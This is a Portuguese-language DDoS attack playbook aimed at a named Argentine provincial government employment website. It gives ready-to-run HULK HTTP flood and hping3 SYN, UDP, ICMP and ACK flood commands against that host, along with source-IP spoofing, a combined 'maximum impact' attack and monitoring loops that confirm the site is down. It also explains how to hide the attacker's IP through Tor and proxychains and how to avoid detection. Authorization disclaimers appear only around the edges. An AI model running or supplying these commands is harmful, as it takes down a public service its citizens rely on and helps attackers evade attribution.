# Roteiro de Ataque DDoS - Desarrollo y Empleo CBA
## Ferramentas: HULK e hping3

**Alvo:** https://desarrolloyempleo.cba.gov.ar/  
**Data:** 21 de Janeiro de 2026  
**Vulnerabilidade:** DE-008 (WP-Cron DoS) e testes de estresse geral  
**⚠️ USAR APENAS EM AMBIENTE AUTORIZADO**

---

## 📋 Índice

1. [Ferramentas Disponíveis](#ferramentas-disponíveis)
2. [Pré-requisitos](#pré-requisitos)
3. [Roteiro 1: HULK (HTTP Flood)](#roteiro-1-hulk-http-flood)
4. [Roteiro 2: hping3 (Network Layer Flood)](#roteiro-2-hping3-network-layer-flood)
5. [Roteiro 3: Ataque Combinado](#roteiro-3-ataque-combinado)
6. [Mascaramento de IP com Tor](#mascaramento-de-ip-com-tor)
7. [Monitoramento e Validação](#monitoramento-e-validação)
8. [Troubleshooting](#troubleshooting)

---

## 🔧 Ferramentas Disponíveis

### 1. HULK (HTTP Unbearable Load King)

**Localização:** `/c/Sec/Tools/DDoS/hulk-original/`

**Descrição:**
- Ferramenta de DoS em camada de aplicação (HTTP)
- Gera tráfego HTTP legítimo em grande volume
- Versão Go (mais eficiente que Python)
- Difícil de distinguir de tráfego legítimo

**Características:**
- ✅ User-Agents aleatórios
- ✅ Headers HTTP variados
- ✅ Requisições HTTP aleatórias (GET, POST, etc.)
- ✅ Multi-threaded (goroutines em Go)
- ✅ Suporte a HTTPS/SSL
- ✅ Baixo consumo de recursos

**Arquivo:** `hulk.go` (compilado ou executado via `go run`)

---

### 2. hping3

**Localização:** `/c/Sec/Tools/DDoS/hping3/`

**Descrição:**
- Ferramenta de geração de pacotes de rede
- Ataques em camada de transporte/rede
- Executado via Docker (Kali Linux)
- Múltiplos tipos de flood disponíveis

**Características:**
- ✅ SYN Flood (TCP)
- ✅ UDP Flood
- ✅ ICMP Flood (Ping Flood)
- ✅ ACK Flood
- ✅ FIN Flood
- ✅ Falsificação de IP (spoofing)
- ✅ Fragmentação de pacotes

**Arquivos:**
- `hping3.sh` - Script helper para executar via Docker
- `docker-compose.yml` - Configuração do container

---

## 📦 Pré-requisitos

### Para HULK:

```bash
# Verificar se Go está instalado
go version

# Se não estiver instalado:
# Windows: Baixar de https://go.dev/dl/
# Ou usar: go run hulk.go (não requer compilação)
```

### Para hping3:

```bash
# Verificar se Docker está instalado
docker --version

# Se não estiver instalado:
# Windows: Instalar Docker Desktop
# https://www.docker.com/products/docker-desktop
```

### Verificar instalações:

```bash
# Verificar Go
go version || echo "Go não instalado"

# Verificar Docker
docker --version || echo "Docker não instalado"

# Verificar Docker Compose
docker-compose --version || docker compose version || echo "Docker Compose não instalado"
```

---

## 🚀 Roteiro 1: HULK (HTTP Flood)

### Objetivo
Gerar tráfego HTTP massivo para sobrecarregar o servidor web.

### Passo 1: Navegar até o diretório HULK

```bash
cd /c/Sec/Tools/DDoS/hulk-original
```

### Passo 2: Compilar HULK (opcional, pode usar `go run`)

```bash
# Compilar para executável
go build hulk.go

# Isso criará um arquivo 'hulk.exe' (Windows) ou 'hulk' (Linux/Mac)
```

### Passo 3: Executar HULK no alvo

#### Opção A: Executar diretamente com Go (sem compilar)

```bash
# Ataque básico
go run hulk.go -site https://desarrolloyempleo.cba.gov.ar

# Com pool de conexões maior (padrão: 1024)
HULKMAXPROCS=2048 go run hulk.go -site https://desarrolloyempleo.cba.gov.ar

# Redirecionar erros para arquivo
go run hulk.go -site https://desarrolloyempleo.cba.gov.ar 2>hulk_errors.log
```

#### Opção B: Usar executável compilado

```bash
# Se compilou anteriormente
./hulk -site https://desarrolloyempleo.cba.gov.ar

# Com pool maior
HULKMAXPROCS=2048 ./hulk -site https://desarrolloyempleo.cba.gov.ar
```

### Passo 4: Monitorar o ataque

**Em outro terminal, monitorar o site:**

```bash
# Testar resposta do site
while true; do
  echo -n "$(date): "
  curl -s -o /dev/null -w "Status: %{http_code}, Tempo: %{time_total}s\n" \
    https://desarrolloyempleo.cba.gov.ar/
  sleep 2
done
```

### Passo 5: Interromper o ataque

```bash
# Pressionar Ctrl+C no terminal onde HULK está rodando
```

### Parâmetros do HULK

| Parâmetro | Descrição | Padrão |
|-----------|-----------|--------|
| `-site URL` | URL alvo (obrigatório) | - |
| `HULKMAXPROCS` | Tamanho do pool de conexões | 1024 |

### Exemplo Completo

```bash
cd /c/Sec/Tools/DDoS/hulk-original

# Iniciar ataque com 2048 conexões simultâneas
HULKMAXPROCS=2048 go run hulk.go -site https://desarrolloyempleo.cba.gov.ar 2>hulk_errors.log

# Em outro terminal, monitorar:
watch -n 2 'curl -s -o /dev/null -w "Status: %{http_code}, Tempo: %{time_total}s\n" https://desarrolloyempleo.cba.gov.ar/'
```

---

## 🎯 Roteiro 2: hping3 (Network Layer Flood)

### Objetivo
Gerar pacotes de rede em camada baixa para sobrecarregar o servidor.

### Passo 1: Verificar Docker

```bash
# Verificar se Docker está rodando
docker ps

# Se não estiver, iniciar Docker Desktop
```

### Passo 2: Navegar até o diretório hping3

```bash
cd /c/Sec/Tools/DDoS/hping3
```

### Passo 3: Iniciar o container (se necessário)

```bash
# Iniciar container via docker-compose
docker-compose up -d

# Verificar se está rodando
docker-compose ps
```

### Passo 4: Executar ataques hping3

#### Ataque 1: SYN Flood (Porta 443 - HTTPS)

```bash
# Usando o script helper
./hping3.sh -S -p 443 -i u1 --flood desarrolloyempleo.cba.gov.ar

# Ou diretamente via docker-compose
docker-compose exec hping3 hping3 -S -p 443 -i u1 --flood desarrolloyempleo.cba.gov.ar
```

**Explicação:**
- `-S`: Flag SYN (inicia conexão TCP)
- `-p 443`: Porta HTTPS
- `-i u1`: Intervalo de 1 microssegundo (máxima velocidade)
- `--flood`: Modo flood (não espera respostas)

#### Ataque 2: UDP Flood (Porta 443)

```bash
./hping3.sh --udp -p 443 -i u1 --flood desarrolloyempleo.cba.gov.ar
```

#### Ataque 3: ICMP Flood (Ping Flood)

```bash
./hping3.sh -1 -i u1 --flood desarrolloyempleo.cba.gov.ar
```

#### Ataque 4: ACK Flood (Porta 443)

```bash
./hping3.sh -A -p 443 -i u1 --flood desarrolloyempleo.cba.gov.ar
```

#### Ataque 5: Com limite de pacotes (mais controlado)

```bash
# Enviar 10.000 pacotes e parar
./hping3.sh -S -p 443 -i u1 --flood -c 10000 desarrolloyempleo.cba.gov.ar
```

#### Ataque 6: Com falsificação de IP (spoofing)

```bash
# Falsificar IP de origem (exemplo: 192.168.1.100)
./hping3.sh -S -p 443 -i u1 --flood -a 192.168.1.100 desarrolloyempleo.cba.gov.ar
```

### Passo 5: Interromper o ataque

```bash
# Pressionar Ctrl+C
# Ou parar o container:
docker-compose stop
```

### Passo 6: Parar o container (quando terminar)

```bash
docker-compose down
```

---

## 🔥 Roteiro 3: Ataque Combinado

### Objetivo
Combinar HULK (HTTP) + hping3 (Network) para máximo impacto.

### Estratégia

1. **HULK** ataca a camada de aplicação (HTTP)
2. **hping3** ataca a camada de transporte/rede (TCP/UDP)
3. Ambos executam simultaneamente

### Execução

#### Terminal 1: HULK (HTTP Flood)

```bash
cd /c/Sec/Tools/DDoS/hulk-original
HULKMAXPROCS=2048 go run hulk.go -site https://desarrolloyempleo.cba.gov.ar 2>hulk_errors.log
```

#### Terminal 2: hping3 (SYN Flood)

```bash
cd /c/Sec/Tools/DDoS/hping3
./hping3.sh -S -p 443 -i u1 --flood desarrolloyempleo.cba.gov.ar
```

#### Terminal 3: Monitoramento

```bash
# Monitorar resposta do site
while true; do
  echo -n "$(date '+%H:%M:%S'): "
  response=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" \
    https://desarrolloyempleo.cba.gov.ar/ 2>/dev/null)
  status=$(echo $response | cut -d'|' -f1)
  time=$(echo $response | cut -d'|' -f2)
  echo "Status: $status, Tempo: ${time}s"
  sleep 1
done
```

### Interromper tudo

```bash
# Terminal 1: Ctrl+C (HULK)
# Terminal 2: Ctrl+C (hping3)
# Terminal 3: Ctrl+C (monitoramento)

# Parar container hping3
cd /c/Sec/Tools/DDoS/hping3
docker-compose down
```

---

## 🎭 Mascaramento de IP com Tor

### Para HULK (via proxy SOCKS5)

**HULK não suporta proxy nativamente**, mas você pode usar:

#### Opção 1: Usar proxychains (Linux/WSL)

```bash
# Instalar proxychains
sudo apt-get install proxychains4

# Configurar proxychains para usar Tor
echo "socks5 127.0.0.1 9150" >> ~/.proxychains/proxychains.conf

# Executar HULK através do Tor
proxychains4 go run hulk.go -site https://desarrolloyempleo.cba.gov.ar
```

#### Opção 2: Modificar código HULK (avançado)

Adicionar suporte a proxy SOCKS5 no código Go do HULK.

### Para hping3

**hping3 não suporta proxy nativamente** (opera em camada de rede).

**Alternativa:** Usar VPN ou Tor em nível de sistema operacional.

---

## 📊 Monitoramento e Validação

### Teste 1: Verificar disponibilidade antes do ataque

```bash
# Teste inicial
curl -s -o /dev/null -w "Status: %{http_code}, Tempo: %{time_total}s\n" \
  https://desarrolloyempleo.cba.gov.ar/

# Deve retornar: Status: 200, Tempo: ~2-3s
```

### Teste 2: Monitorar durante o ataque

```bash
# Script de monitoramento contínuo
while true; do
  timestamp=$(date '+%Y-%m-%d %H:%M:%S')
  response=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}|%{size_download}" \
    https://desarrolloyempleo.cba.gov.ar/ 2>/dev/null)
  
  if [ -z "$response" ]; then
    echo "[$timestamp] ❌ Site não responde (timeout ou erro)"
  else
    status=$(echo $response | cut -d'|' -f1)
    time=$(echo $response | cut -d'|' -f2)
    size=$(echo $response | cut -d'|' -f3)
    
    if [ "$status" = "200" ]; then
      echo "[$timestamp] ✅ Status: $status, Tempo: ${time}s, Tamanho: ${size} bytes"
    else
      echo "[$timestamp] ⚠️  Status: $status, Tempo: ${time}s"
    fi
  fi
  
  sleep 2
done
```

### Teste 3: Verificar após o ataque

```bash
# Teste final
echo "=== TESTE APÓS ATAQUE ==="
curl -s -o /dev/null -w "Status: %{http_code}\nTempo: %{time_total}s\n" \
  https://desarrolloyempleo.cba.gov.ar/

# Comparar com resultado inicial
```

### Métricas para validar DoS

| Métrica | Normal | Sobrecarga | DoS Confirmado |
|---------|--------|------------|----------------|
| Status HTTP | 200 | 200/503 | Timeout/Erro |
| Tempo de resposta | 1-3s | 5-10s | >10s ou timeout |
| Taxa de sucesso | 100% | 50-90% | <50% |

---

## 🔧 Troubleshooting

### Problema: HULK não executa

```bash
# Verificar se Go está instalado
go version

# Se não estiver, instalar Go
# Windows: https://go.dev/dl/
# Ou usar: go run hulk.go (não requer instalação permanente)
```

### Problema: hping3 container não inicia

```bash
# Verificar Docker
docker ps

# Verificar logs
cd /c/Sec/Tools/DDoS/hping3
docker-compose logs

# Reiniciar container
docker-compose down
docker-compose up -d
```

### Problema: "Permission denied" no hping3.sh

```bash
# Dar permissão de execução
chmod +x /c/Sec/Tools/DDoS/hping3/hping3.sh
```

### Problema: Site não responde (pode ser bloqueio)

```bash
# Verificar se o site está acessível normalmente
curl -I https://desarrolloyempleo.cba.gov.ar/

# Se retornar erro, pode ser:
# 1. Firewall bloqueando seu IP
# 2. Rate limiting ativo
# 3. Site realmente caiu
```

### Problema: Ataque muito lento

```bash
# Para HULK: Aumentar pool de conexões
HULKMAXPROCS=4096 go run hulk.go -site https://desarrolloyempleo.cba.gov.ar

# Para hping3: Verificar se não há limitação de rede
# Verificar largura de banda disponível
```

---

## 📝 Exemplos Práticos Completos

### Exemplo 1: Ataque HULK Básico

```bash
# Terminal 1: Executar HULK
cd /c/Sec/Tools/DDoS/hulk-original
HULKMAXPROCS=1024 go run hulk.go -site https://desarrolloyempleo.cba.gov.ar

# Terminal 2: Monitorar
watch -n 1 'curl -s -o /dev/null -w "Status: %{http_code}, Tempo: %{time_total}s\n" https://desarrolloyempleo.cba.gov.ar/'
```

### Exemplo 2: Ataque hping3 SYN Flood

```bash
# Terminal 1: Iniciar container
cd /c/Sec/Tools/DDoS/hping3
docker-compose up -d

# Terminal 2: Executar SYN Flood
./hping3.sh -S -p 443 -i u1 --flood desarrolloyempleo.cba.gov.ar

# Terminal 3: Monitorar
while true; do
  curl -s -o /dev/null -w "%{http_code}\n" https://desarrolloyempleo.cba.gov.ar/
  sleep 1
done
```

### Exemplo 3: Ataque Combinado (Máximo Impacto)

```bash
# Terminal 1: HULK
cd /c/Sec/Tools/DDoS/hulk-original
HULKMAXPROCS=2048 go run hulk.go -site https://desarrolloyempleo.cba.gov.ar 2>hulk.log &

# Terminal 2: hping3 SYN Flood
cd /c/Sec/Tools/DDoS/hping3
docker-compose up -d
./hping3.sh -S -p 443 -i u1 --flood desarrolloyempleo.cba.gov.ar &

# Terminal 3: hping3 UDP Flood
cd /c/Sec/Tools/DDoS/hping3
./hping3.sh --udp -p 443 -i u1 --flood desarrolloyempleo.cba.gov.ar &

# Terminal 4: Monitoramento
while true; do
  echo "$(date): $(curl -s -o /dev/null -w "%{http_code}|%{time_total}" https://desarrolloyempleo.cba.gov.ar/)"
  sleep 1
done
```

---

## ⚠️ Avisos Importantes

### 1. Autorização
- ✅ **SEMPRE** obtenha autorização escrita antes de executar
- ✅ Use apenas em ambientes de teste autorizados
- ❌ **NUNCA** execute em produção sem autorização

### 2. Impacto
- Estes ataques podem derrubar o site
- Podem afetar outros serviços no mesmo servidor
- Podem gerar custos extras para o alvo

### 3. Legalidade
- Ataques DDoS são **ilegais** sem autorização
- Use apenas em testes autorizados
- Documente tudo para o relatório

### 4. Responsabilidade
- O uso é de sua responsabilidade exclusiva
- Sempre monitore o impacto
- Pare imediatamente se solicitado

---

## 📊 Comparação das Ferramentas

| Ferramenta | Camada | Eficiência | Detecção | Uso Recomendado |
|------------|--------|------------|----------|-----------------|
| **HULK** | Aplicação (HTTP) | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ (difícil) | Teste de estresse HTTP |
| **hping3 SYN** | Transporte (TCP) | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ (média) | Teste de capacidade de rede |
| **hping3 UDP** | Transporte (UDP) | ⭐⭐⭐⭐⭐ | ⭐⭐ (fácil) | Teste de firewall |
| **hping3 ICMP** | Rede (ICMP) | ⭐⭐⭐⭐ | ⭐ (muito fácil) | Teste básico de conectividade |

---

## 🎯 Recomendações de Uso

### Para Teste de Estresse HTTP:
→ **Use HULK** (mais realista, tráfego legítimo)

### Para Teste de Capacidade de Rede:
→ **Use hping3 SYN Flood** (mais eficiente)

### Para Teste Completo:
→ **Use ambos simultaneamente** (máximo impacto)

### Para Evitar Detecção:
→ **Use HULK** (tráfego parece legítimo)

---

## 📚 Referências

- **HULK Original (Python):** http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
- **HULK Go Version:** https://github.com/grafov/hulk
- **hping3:** http://www.hping.org/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/

---

## ✅ Checklist Antes de Executar

- [ ] Autorização escrita obtida
- [ ] Ambiente de teste confirmado
- [ ] Go instalado (para HULK)
- [ ] Docker instalado e rodando (para hping3)
- [ ] Tor Browser aberto (se usar mascaramento)
- [ ] Script de monitoramento preparado
- [ ] Plano de interrupção definido
- [ ] Documentação pronta para resultados

---

**⚠️ LEMBRE-SE: Use estas ferramentas apenas em testes autorizados!**
